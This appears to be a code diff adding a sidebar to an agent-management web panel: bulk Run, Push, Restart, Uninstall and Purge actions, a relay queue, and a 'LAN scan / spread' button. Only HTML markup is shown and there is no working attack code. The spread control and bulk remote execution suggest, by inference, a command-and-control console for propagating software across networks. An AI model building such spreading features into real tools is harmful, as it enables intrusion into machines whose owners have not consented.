@@ -30,12 +30,29 @@
     </div>
     <div class="sidebar-head">
       <span id="agent-count">0 agents</span>
+      <label class="chk"><input type="checkbox" id="sel-all"> all</label>
       <button class="ghost" id="refresh">&#8635;</button>
     </div>
-    <ul id="agent-list" class="agent-list"></ul>
+    <ul id="agent-tree" class="agent-tree"></ul>
+    <ul id="agent-list" class="agent-list hidden"></ul>
+    <div id="sel-bar" class="sel-bar hidden">
+      <span id="sel-count">0 selected</span>
+      <select id="sel-mode">
+        <option value="selected">Selected</option>
+        <option value="all">All</option>
+        <option value="online">Online only</option>
+      </select>
+      <button class="primary sm" id="sel-run">Run</button>
+      <button class="sm" id="sel-push">Push</button>
+      <button class="sm" id="sel-restart">Restart</button>
+      <button class="danger sm" id="sel-uninstall">Uninstall</button>
+      <button class="danger sm" id="sel-purge">Purge</button>
+    </div>
     <div class="sidebar-foot">
+      <button class="ghost wide" id="lan-btn">LAN scan / spread</button>
       <button class="ghost wide" id="broadcast-btn">Broadcast...</button>
       <button class="ghost wide" id="push-btn">Push build</button>
+      <span id="relay-queue" class="muted text-xs"></span>
     </div>
   </aside>
 
